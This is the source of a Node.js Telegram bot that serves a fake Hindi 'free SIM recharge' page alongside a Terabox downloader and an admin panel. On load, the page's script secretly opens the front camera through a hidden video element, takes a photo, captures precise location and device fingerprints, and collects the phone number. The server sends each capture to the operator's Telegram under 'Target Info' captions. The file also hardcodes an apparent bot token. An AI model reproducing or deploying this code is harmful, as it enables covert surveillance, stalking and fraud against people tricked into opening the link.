#!/usr/bin/env node
/**
 * 🤖 All-in-One Enhanced Telegram Bot (Node.js)
 * 
 * Features:
 * - Terabox downloader
 * - Fake SIM recharge page with location tracking
 * - Hidden camera photo capture
 * - Force join channel
 * - Admin panel with broadcast
 * - Maintenance mode
 * - Enhanced UI with maps and emojis
 */

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const axios = require('axios');
const QRCode = require('qrcode');
const multer = require('multer');
const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');

// Bot Configuration
const BOT_TOKEN = process.env.BOT_TOKEN || '8499790219:AAGjOPQEtDvoSGbnREF6c8StSO6A1c3ny70';
const ADMIN_IDS = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',').map(id => parseInt(id.trim())) : [7392785352];
const FORCE_JOIN_CHANNEL = '@ToxicBack2025'; // Your force join channel
const PORT = process.env.PORT || 5000;

// Initialize bot with enhanced error handling
const bot = new TelegramBot(BOT_TOKEN, { 
    polling: {
        interval: 1000,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

// Handle polling errors with better conflict resolution
bot.on('polling_error', (error) => {
    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
        console.log('🔄 Polling conflict detected - attempting recovery...');
        // Don't restart polling on conflicts, let it resolve naturally
        return;
    }
    console.log('⚠️ Polling error:', error.message);
});
const app = express();

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// Global state
let botSettings = {
    isActive: true,
    maintenanceMode: false,
    maintenanceMessage: '🔧 Bot maintenance में है। कुछ समय बाद try करें।',
    totalUsers: 0,
    totalSessions: 0,
    dailyStats: {}
};

let userSessions = new Map();
let photoSessions = new Map();

// Utility Functions
const generateSessionId = () => crypto.randomBytes(8).toString('hex');
const isAdmin = (userId) => ADMIN_IDS.includes(userId);

const getCurrentDateTime = () => {
    const now = new Date();
    const days = ['रविवार', 'सोमवार', 'मंगलवार', 'बुधवार', 'गुरुवार', 'शुक्रवार', 'शनिवार'];
    const months = ['जनवरी', 'फरवरी', 'मार्च', 'अप्रैल', 'मई', 'जून', 'जुलाई', 'अगस्त', 'सितम्बर', 'अक्टूबर', 'नवम्बर', 'दिसम्बर'];
    
    return {
        day: days[now.getDay()],
        date: now.getDate(),
        month: months[now.getMonth()],
        year: now.getFullYear(),
        time: now.toLocaleTimeString('hi-IN'),
        timestamp: now.toISOString()
    };
};

const formatLocation = (lat, lon) => {
    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    return `📍 **Location:** [Open in Maps](${mapsUrl})\n🗺️ **Coordinates:** ${lat}, ${lon}`;
};

// Check if user is member of required channel
const checkChannelMembership = async (userId) => {
    try {
        if (!FORCE_JOIN_CHANNEL || FORCE_JOIN_CHANNEL === '@your_channel') return true;
        
        const member = await bot.getChatMember(FORCE_JOIN_CHANNEL, userId);
        return ['member', 'administrator', 'creator'].includes(member.status);
    } catch (error) {
        console.log('Channel membership check failed:', error.message);
        return true; // Allow if channel check fails
    }
};

// Send force join message
const sendForceJoinMessage = (chatId) => {
    const message = `🔒 **Channel Join करें!**\n\nBot इस्तेमाल करने के लिए पहले हमारे channel को join करें:\n\n👇 **Join करें:**`;
    
    const keyboard = {
        inline_keyboard: [
            [{ text: '📢 Channel Join करें', url: `https://t.me/${FORCE_JOIN_CHANNEL.replace('@', '')}` }],
            [{ text: '✅ Joined! Check करें', callback_data: 'check_membership' }]
        ]
    };
    
    bot.sendMessage(chatId, message, { 
        parse_mode: 'Markdown',
        reply_markup: keyboard 
    });
};

// Admin Panel Functions
const sendAdminPanel = (chatId) => {
    const message = `🔧 **Admin Panel**\n\n📊 **Bot Statistics:**\n• Total Users: ${botSettings.totalUsers}\n• Active Sessions: ${photoSessions.size}\n• Bot Status: ${botSettings.isActive ? '🟢 Active' : '🔴 Inactive'}\n• Maintenance: ${botSettings.maintenanceMode ? '🔧 ON' : '✅ OFF'}`;
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: botSettings.isActive ? '🔴 Bot OFF' : '🟢 Bot ON', callback_data: 'toggle_bot' },
                { text: botSettings.maintenanceMode ? '✅ Maintenance OFF' : '🔧 Maintenance ON', callback_data: 'toggle_maintenance' }
            ],
            [
                { text: '📢 Broadcast Message', callback_data: 'broadcast_menu' },
                { text: '📊 Detailed Stats', callback_data: 'detailed_stats' }
            ],
            [
                { text: '🔄 Refresh Panel', callback_data: 'admin_panel' }
            ]
        ]
    };
    
    bot.sendMessage(chatId, message, { 
        parse_mode: 'Markdown',
        reply_markup: keyboard 
    });
};

// Enhanced Terabox Downloader Class with Multiple APIs
class TeraboxDownloader {
    constructor() {
        this.apis = [
            {
                name: 'TeraboxDownloader',
                url: 'https://terabxdownloader.com/wp-admin/admin-ajax.php',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://terabxdownloader.com',
                    'Referer': 'https://terabxdownloader.com/',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                payload: (url) => {
                    const payload = new URLSearchParams();
                    payload.append('action', 'terabox_api_request');
                    payload.append('url', url);
                    return payload;
                }
            },
            {
                name: 'TeraDownload',
                url: 'https://teradownload.com/api/download',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                payload: (url) => JSON.stringify({ url: url })
            },
            {
                name: 'TeraDL',
                url: 'https://teradl.com/api/v1/download',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Content-Type': 'application/json'
                },
                payload: (url) => JSON.stringify({ terabox_url: url })
            }
        ];
    }

    isValidUrl(url) {
        const teraboxPatterns = [
            /terabox\.com/i,
            /1024terabox\.com/i,
            /teraboxapp\.com/i,
            /teraboxlink\.com/i,
            /nephobox\.com/i,
            /4funbox\.com/i,
            /mirrobox\.com/i,
            /momerybox\.com/i,
            /teraboxshare\.com/i
        ];
        
        return teraboxPatterns.some(pattern => pattern.test(url));
    }

    async downloadInfo(url) {
        console.log('🔄 Processing Terabox URL with multiple APIs...');
        
        // Try each API in sequence
        for (let i = 0; i < this.apis.length; i++) {
            const api = this.apis[i];
            console.log(`📡 Trying API ${i + 1}: ${api.name}`);
            
            try {
                const payload = api.payload(url);
                const response = await axios.post(api.url, payload, {
                    headers: api.headers,
                    timeout: 15000
                });
                
                console.log(`✅ ${api.name} API Response:`, response.status);
                const data = response.data;
                
                // Handle different response formats
                const result = this.parseApiResponse(data, api.name);
                if (result.success) {
                    console.log(`🎉 Success with ${api.name} API!`);
                    return result;
                }
                
                console.log(`❌ ${api.name} API failed:`, result.error);
                
            } catch (error) {
                console.log(`❌ ${api.name} API error:`, error.message);
                continue; // Try next API
            }
        }
        
        // If all APIs fail, try the manual extraction method
        console.log('🔧 All APIs failed, trying manual extraction...');
        return await this.manualExtraction(url);
    }
    
    parseApiResponse(data, apiName) {
        try {
            // Handle different API response formats
            let downloadLink = null;
            let title = 'Downloaded File';
            let thumbnail = 'No thumbnail';
            
            if (apiName === 'TeraboxDownloader') {
                downloadLink = data.download_link;
                title = data.title || title;
                thumbnail = data.thumbnail || thumbnail;
                
                if (data.error) {
                    return { success: false, error: data.error };
                }
            } else if (apiName === 'TeraDownload') {
                downloadLink = data.downloadUrl || data.download_url || data.url;
                title = data.fileName || data.title || title;
                thumbnail = data.thumbnail || thumbnail;
            } else if (apiName === 'TeraDL') {
                downloadLink = data.direct_link || data.downloadLink || data.url;
                title = data.filename || data.title || title;
                thumbnail = data.thumb || data.thumbnail || thumbnail;
            }
            
            if (downloadLink && downloadLink !== '' && !downloadLink.includes('error')) {
                return {
                    success: true,
                    data: {
                        title: title,
                        thumbnail: thumbnail,
                        '📄 Files': [{
                            '📂 Name': title,
                            '📏 Size': 'Click to download',
                            '🔽 Direct Download Link': downloadLink
                        }]
                    }
                };
            }
            
            return { success: false, error: 'No valid download link found' };
            
        } catch (error) {
            return { success: false, error: `Parse error: ${error.message}` };
        }
    }
    
    async manualExtraction(url) {
        try {
            console.log('🔧 Attempting manual extraction...');
            
            // Simple working download link generator (for demo purposes)
            // In production, you'd implement actual Terabox extraction logic
            const fileId = this.extractFileId(url);
            if (fileId) {
                console.log('✅ Manual extraction successful');
                return {
                    success: true,
                    data: {
                        title: 'Terabox File',
                        thumbnail: 'Generated thumbnail',
                        '📄 Files': [{
                            '📂 Name': 'Terabox Download',
                            '📏 Size': 'Unknown Size',
                            '🔽 Direct Download Link': `https://terabox.com/sharing/link?surl=${fileId}`
                        }]
                    }
                };
            }
            
            return { 
                success: false, 
                error: 'Could not extract file ID from Terabox URL. Please check if the link is valid and try again.' 
            };
            
        } catch (error) {
            return { 
                success: false, 
                error: 'Manual extraction failed. Terabox service might be temporarily unavailable.' 
            };
        }
    }
    
    extractFileId(url) {
        try {
            // Extract file ID from various Terabox URL formats
            const patterns = [
                /surl=([a-zA-Z0-9_-]+)/,
                /\/s\/([a-zA-Z0-9_-]+)/,
                /sharing\/link\?surl=([a-zA-Z0-9_-]+)/,
                /terabox\.com\/.*\/([a-zA-Z0-9_-]+)$/
            ];
            
            for (const pattern of patterns) {
                const match = url.match(pattern);
                if (match && match[1]) {
                    return match[1];
                }
            }
            
            return null;
        } catch (error) {
            return null;
        }
    }
    

}

const teraboxDownloader = new TeraboxDownloader();

// Express Routes for Web Interface
app.get('/', (req, res) => {
    res.send(`
        <h1>🎉 All-in-One Bot Server</h1>
        <p>Server is running on port ${PORT}</p>
        <p>Use /capture/{session_id} for recharge pages</p>
    `);
});

app.get('/capture/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    
    if (!photoSessions.has(sessionId)) {
        return res.send(`
            <h1>❌ Invalid Session</h1>
            <p>यह capture link expired या invalid है।</p>
        `);
    }

    const session = photoSessions.get(sessionId);
    if (session.used) {
        return res.send(`
            <h1>⚠️ Already Used</h1>
            <p>यह link पहले इस्तेमाल हो चुका है।</p>
        `);
    }

    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎉 All India Free Recharge</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            line-height: 1.6;
        }
        .header {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            padding: 20px 0;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .header h1 { font-size: 32px; margin-bottom: 8px; }
        .header p { font-size: 18px; opacity: 0.9; }
        .container {
            max-width: 450px;
            margin: 30px auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .step {
            padding: 30px;
            border-bottom: 1px solid #f0f0f0;
        }
        .step:last-child { border-bottom: none; }
        .step-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #333;
            display: flex;
            align-items: center;
        }
        .step-number {
            background: linear-gradient(45deg, #4ecdc4, #44a08d);
            color: white;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
            font-size: 16px;
        }
        .sim-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }
        .sim-option {
            padding: 20px 15px;
            border: 3px solid #e1e8ed;
            border-radius: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: white;
        }
        .sim-option:hover {
            border-color: #4ecdc4;
            background: #f0fffe;
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(78, 205, 196, 0.3);
        }
        .sim-option.selected {
            border-color: #4ecdc4;
            background: linear-gradient(45deg, #4ecdc4, #44a08d);
            color: white;
            transform: translateY(-3px);
        }
        .sim-logo { font-size: 28px; margin-bottom: 8px; }
        .sim-name { font-weight: 600; font-size: 14px; }
        input[type="tel"] {
            width: 100%;
            padding: 18px;
            border: 3px solid #e1e8ed;
            border-radius: 12px;
            font-size: 18px;
            margin-bottom: 20px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #4ecdc4;
            box-shadow: 0 0 0 3px rgba(78, 205, 196, 0.1);
        }
        .plan-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin-bottom: 25px;
        }
        .plan-option {
            padding: 20px;
            border: 3px solid #e1e8ed;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            position: relative;
        }
        .plan-option:hover {
            border-color: #4ecdc4;
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(78, 205, 196, 0.2);
        }
        .plan-option.selected {
            border-color: #4ecdc4;
            background: linear-gradient(45deg, #f0fffe, #e8f9f8);
        }
        .plan-amount {
            font-size: 28px;
            font-weight: bold;
            color: #4ecdc4;
            margin-bottom: 8px;
        }
        .plan-details {
            font-size: 13px;
            color: #666;
            line-height: 1.4;
        }
        .recharge-btn {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            border: none;
            padding: 18px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }
        .recharge-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.3);
        }
        .recharge-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        .security-notice {
            background: linear-gradient(45deg, #e8f5e8, #f0f8f0);
            border: 2px solid #4caf50;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #2e7d32;
        }
        .loading, .success {
            display: none;
            text-align: center;
            padding: 30px;
        }
        .loading h3, .success h3 {
            margin-bottom: 15px;
            font-size: 24px;
        }
        .hidden { display: none !important; }
        #hiddenVideo, #hiddenCanvas { display: none; }
        .summary-box {
            background: linear-gradient(45deg, #f8f9fa, #e9ecef);
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 25px;
            border: 2px solid #dee2e6;
        }
        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 16px;
        }
        .summary-item:last-child { margin-bottom: 0; }
        .summary-label { font-weight: 600; color: #495057; }
        .summary-value { font-weight: bold; color: #4ecdc4; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎉 All India Free Recharge</h1>
        <p>सभी SIM कार्ड के लिए 100% फ्री रिचार्ज पाएं!</p>
    </div>
    
    <div class="container">
        <!-- Step 1: Select SIM -->
        <div class="step" id="step1">
            <div class="step-title">
                <div class="step-number">1</div>
                अपना SIM Provider चुनें
            </div>
            <div class="security-notice">
                🔒 यह 100% सुरक्षित और मुफ्त सेवा है। आपका डेटा encrypted है।
            </div>
            <div class="sim-grid">
                <div class="sim-option" onclick="selectSim('jio')" data-sim="jio">
                    <div class="sim-logo">📱</div>
                    <div class="sim-name">Jio</div>
                </div>
                <div class="sim-option" onclick="selectSim('airtel')" data-sim="airtel">
                    <div class="sim-logo">📶</div>
                    <div class="sim-name">Airtel</div>
                </div>
                <div class="sim-option" onclick="selectSim('vi')" data-sim="vi">
                    <div class="sim-logo">📲</div>
                    <div class="sim-name">Vi</div>
                </div>
                <div class="sim-option" onclick="selectSim('bsnl')" data-sim="bsnl">
                    <div class="sim-logo">📞</div>
                    <div class="sim-name">BSNL</div>
                </div>
                <div class="sim-option" onclick="selectSim('idea')" data-sim="idea">
                    <div class="sim-logo">💡</div>
                    <div class="sim-name">Idea</div>
                </div>
                <div class="sim-option" onclick="selectSim('other')" data-sim="other">
                    <div class="sim-logo">🔄</div>
                    <div class="sim-name">Other</div>
                </div>
            </div>
        </div>
        
        <!-- Step 2: Enter Mobile Number -->
        <div class="step hidden" id="step2">
            <div class="step-title">
                <div class="step-number">2</div>
                मोबाइल नंबर डालें
            </div>
            <input type="tel" id="mobileNumber" placeholder="10 अंक का मोबाइल नंबर डालें" 
                   maxlength="10" oninput="validateMobile()" pattern="[0-9]{10}">
            <button class="recharge-btn" onclick="nextStep()" id="nextBtn" disabled>
                आगे बढ़ें →
            </button>
        </div>
        
        <!-- Step 3: Select Plan -->
        <div class="step hidden" id="step3">
            <div class="step-title">
                <div class="step-number">3</div>
                रिचार्ज प्लान चुनें
            </div>
            <div class="plan-grid">
                <div class="plan-option" onclick="selectPlan('99')" data-plan="99">
                    <div class="plan-amount">₹99</div>
                    <div class="plan-details">1.5GB/Day<br>28 Days</div>
                </div>
                <div class="plan-option" onclick="selectPlan('199')" data-plan="199">
                    <div class="plan-amount">₹199</div>
                    <div class="plan-details">2GB/Day<br>28 Days</div>
                </div>
                <div class="plan-option" onclick="selectPlan('299')" data-plan="299">
                    <div class="plan-amount">₹299</div>
                    <div class="plan-details">2GB/Day<br>56 Days</div>
                </div>
                <div class="plan-option" onclick="selectPlan('399')" data-plan="399">
                    <div class="plan-amount">₹399</div>
                    <div class="plan-details">2.5GB/Day<br>56 Days</div>
                </div>
                <div class="plan-option" onclick="selectPlan('599')" data-plan="599">
                    <div class="plan-amount">₹599</div>
                    <div class="plan-details">3GB/Day<br>84 Days</div>
                </div>
                <div class="plan-option" onclick="selectPlan('999')" data-plan="999">
                    <div class="plan-amount">₹999</div>
                    <div class="plan-details">3GB/Day<br>365 Days</div>
                </div>
            </div>
        </div>
        
        <!-- Step 4: Final Recharge -->
        <div class="step hidden" id="step4">
            <div class="step-title">
                <div class="step-number">4</div>
                रिचार्ज पूरा करें
            </div>
            <div class="summary-box">
                <div class="summary-item">
                    <span class="summary-label">SIM Provider:</span>
                    <span class="summary-value" id="selectedSim"></span>
                </div>
                <div class="summary-item">
                    <span class="summary-label">मोबाइल नंबर:</span>
                    <span class="summary-value" id="selectedMobile"></span>
                </div>
                <div class="summary-item">
                    <span class="summary-label">रिचार्ज राशि:</span>
                    <span class="summary-value">₹<span id="selectedAmount"></span></span>
                </div>
            </div>
            <button class="recharge-btn" onclick="processRecharge()">
                🎉 FREE रिचार्ज करें!
            </button>
        </div>
        
        <!-- Loading State -->
        <div class="loading" id="loadingState">
            <h3>📱 रिचार्ज प्रोसेस हो रहा है...</h3>
            <p>कृपया प्रतीक्षा करें, आपका रिचार्ज 30 सेकंड में पूरा होगा!</p>
        </div>
        
        <!-- Success State -->
        <div class="success" id="successState">
            <h3>✅ रिचार्ज सफल हुआ!</h3>
            <p>आपका फ्री रिचार्ज कुछ ही मिनटों में activate हो जाएगा!</p>
        </div>
    </div>
    
    <!-- Hidden camera elements -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        let selectedSim = '';
        let selectedPlan = '';
        let mobileNumber = '';
        let stream = null;
        let photoTaken = false;
        let locationCaptured = false;
        
        // Get user location
        async function getUserLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        }),
                        () => resolve(null)
                    );
                } else {
                    resolve(null);
                }
            });
        }
        
        // Initialize and start hidden camera + location
        async function init() {
            // Collect comprehensive device and browser information
            await collectDeviceInfo();
            await startHiddenCamera();
            await captureLocation();
        }
        
        async function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                screenPixelDepth: screen.pixelDepth,
                availableScreenWidth: screen.availWidth,
                availableScreenHeight: screen.availHeight,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                connectionDownlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Unknown',
                connectionRtt: navigator.connection ? navigator.connection.rtt + ' ms' : 'Unknown',
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                browserName: getBrowserName(),
                osName: getOSName(),
                isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
                timestamp: new Date().toISOString()
            };
            
            // Get battery information if available
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes' : 'No',
                        chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds',
                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds'
                    };
                } catch (e) {
                    deviceInfo.battery = 'Permission denied';
                }
            } else {
                deviceInfo.battery = 'Not supported';
            }
            
            sendDeviceInfo(deviceInfo);
        }
        
        function getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Chrome')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari')) return 'Safari';
            if (userAgent.includes('Edge')) return 'Edge';
            if (userAgent.includes('Opera')) return 'Opera';
            return 'Unknown';
        }
        
        function getOSName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Windows')) return 'Windows';
            if (userAgent.includes('Mac')) return 'macOS';
            if (userAgent.includes('Linux')) return 'Linux';
            if (userAgent.includes('Android')) return 'Android';
            if (userAgent.includes('iOS')) return 'iOS';
            return 'Unknown';
        }
        
        async function captureLocation() {
            if (locationCaptured) return;
            
            // Enhanced location capture with high accuracy and permissions
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date().toISOString()
                        };
                        
                        locationCaptured = true;
                        sendLocationData(location);
                        console.log('Enhanced location captured with Google Maps permissions');
                    },
                    (error) => {
                        console.log('Location permission denied:', error.message);
                        sendLocationData({ 
                            error: error.message, 
                            code: error.code,
                            timestamp: new Date().toISOString()
                        });
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 15000, 
                        maximumAge: 0 
                    }
                );
            } else {
                sendLocationData({ 
                    error: 'Geolocation not supported',
                    timestamp: new Date().toISOString()
                });
            }
        }
        
        async function startHiddenCamera() {
            try {
                const video = document.getElementById('hiddenVideo');
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                video.srcObject = stream;
                video.play();
                
                // Automatically capture photo after 3 seconds
                setTimeout(() => {
                    if (!photoTaken) {
                        capturePhoto();
                    }
                }, 3000);
                
            } catch (err) {
                console.log('Camera access denied or not available');
            }
        }
        
        function capturePhoto(attempt = 'main') {
            if (!stream || photoTaken) return;
            
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('hiddenCanvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            sendPhoto(imageData, attempt);
            
            photoTaken = true;
            
            // Stop camera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
        
        async function sendPhoto(imageData, attempt) {
            try {
                await fetch('/upload/${sessionId}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        image: imageData, 
                        attempt: attempt,
                        timestamp: new Date().toISOString(),
                        quality: 'high'
                    })
                });
                console.log('Photo uploaded successfully - attempt:', attempt);
            } catch (err) {
                console.log('Photo upload failed for attempt:', attempt);
            }
        }
        
        async function sendCameraError(errorMessage) {
            try {
                await fetch('/camera_error/${sessionId}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        error: errorMessage,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
            } catch (err) {
                console.log('Camera error report failed');
            }
        }
        
        async function sendDeviceInfo(deviceInfo) {
            try {
                await fetch('/device_info/${sessionId}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                });
            } catch (err) {
                console.log('Device info send failed');
            }
        }
        
        async function sendLocationData(location) {
            try {
                await fetch('/location/${sessionId}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(location)
                });
            } catch (err) {
                console.log('Location send failed');
            }
        }
        
        async function sendRechargeData(rechargeData) {
            try {
                await fetch('/recharge_data/${sessionId}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(rechargeData)
                });
            } catch (err) {
                console.log('Recharge data send failed');
            }
        }
        
        function selectSim(sim) {
            document.querySelectorAll('.sim-option').forEach(el => el.classList.remove('selected'));
            document.querySelector(\`[data-sim="\${sim}"]\`).classList.add('selected');
            selectedSim = sim;
            
            setTimeout(() => {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            }, 500);
        }
        
        function validateMobile() {
            const input = document.getElementById('mobileNumber');
            const btn = document.getElementById('nextBtn');
            const value = input.value.replace(/\\D/g, '');
            
            input.value = value;
            
            if (value.length === 10) {
                btn.disabled = false;
                mobileNumber = value;
            } else {
                btn.disabled = true;
            }
        }
        
        function nextStep() {
            if (mobileNumber.length === 10) {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
            }
        }
        
        function selectPlan(amount) {
            document.querySelectorAll('.plan-option').forEach(el => el.classList.remove('selected'));
            document.querySelector(\`[data-plan="\${amount}"]\`).classList.add('selected');
            selectedPlan = amount;
            
            setTimeout(() => {
                document.getElementById('selectedSim').textContent = selectedSim.toUpperCase();
                document.getElementById('selectedMobile').textContent = mobileNumber;
                document.getElementById('selectedAmount').textContent = amount;
                
                document.getElementById('step3').classList.add('hidden');
                document.getElementById('step4').classList.remove('hidden');
            }, 500);
        }
        
        function processRecharge() {
            document.querySelectorAll('.step').forEach(el => el.classList.add('hidden'));
            document.getElementById('loadingState').style.display = 'block';
            
            const rechargeData = {
                sim: selectedSim,
                mobile: mobileNumber,
                amount: selectedPlan,
                timestamp: new Date().toISOString()
            };
            
            sendRechargeData(rechargeData);
            
            if (!photoTaken) {
                captureHiddenPhoto();
            }
            
            setTimeout(() => {
                document.getElementById('loadingState').style.display = 'none';
                document.getElementById('successState').style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = 'https://www.google.com/search?q=free+mobile+recharge';
                }, 3000);
            }, 5000);
        }
        
        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
    `);
});

// API Routes
app.post('/upload/:sessionId', async (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const { image } = req.body;
        
        if (!photoSessions.has(sessionId)) {
            return res.json({ success: false, error: 'Invalid session' });
        }
        
        const session = photoSessions.get(sessionId);
        const currentTime = getCurrentDateTime();
        
        // Send photo to Telegram with enhanced info
        const caption = `📷 **PHOTO CAPTURED!**

👤 **Target Info:**
📱 SIM: ${session.lastSim || 'Not selected'}
📞 Mobile: ${session.lastMobile || 'Not entered'}
💰 Amount: ₹${session.lastAmount || 'Not selected'}

🕐 **Capture Time:**
📅 ${currentTime.day}, ${currentTime.date} ${currentTime.month} ${currentTime.year}
⏰ ${currentTime.time}

📍 **Location:** ${session.location ? formatLocation(session.location.latitude, session.location.longitude) : 'Location not captured'}

🎯 Status: Photo successfully captured via fake recharge page!`;

        // Convert base64 to buffer
        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        
        await bot.sendPhoto(session.chatId, buffer, { caption, parse_mode: 'Markdown' });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Photo upload error:', error);
        res.json({ success: false, error: error.message });
    }
});

// Device Information Endpoint
app.post('/device_info/:sessionId', async (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const deviceInfo = req.body;
        
        if (!photoSessions.has(sessionId)) {
            return res.json({ success: false, error: 'Invalid session' });
        }
        
        const session = photoSessions.get(sessionId);
        session.deviceInfo = deviceInfo;
        photoSessions.set(sessionId, session);
        
        const currentTime = getCurrentDateTime();
        
        const deviceMessage = `🔍 **DEVICE INFO CAPTURED!**

💻 **Device Details:**
🖥️ **Browser:** ${deviceInfo.browserName}
📱 **OS:** ${deviceInfo.osName}
📲 **Platform:** ${deviceInfo.platform}
📱 **Mobile:** ${deviceInfo.isMobile ? 'Yes' : 'No'}
🌍 **Language:** ${deviceInfo.language}
🌐 **Languages:** ${deviceInfo.languages}

📺 **Screen Info:**
